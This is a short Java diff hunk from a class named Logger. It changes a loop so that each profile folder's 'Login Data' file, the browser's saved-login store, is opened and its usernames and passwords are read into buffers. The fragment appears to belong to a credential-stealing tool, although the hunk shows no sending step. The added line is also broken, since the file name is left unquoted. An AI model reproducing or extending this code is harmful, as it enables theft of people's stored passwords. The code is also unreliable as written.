@@ -44,7 +44,7 @@ public class Logger{
 		    }
 		    System.out.println(folders.toString());
 		    for(String i : folders){
-		    	doublebuffer = getinfo(filepath+i);
+		    	doublebuffer = getinfo(filepath+"\\"+i+"\\"+Login Data);
 		    	bufferuser = doublebuffer.get(0);
 		    	bufferpass = doublebuffer.get(1);
 		    	for(String j : bufferpass)
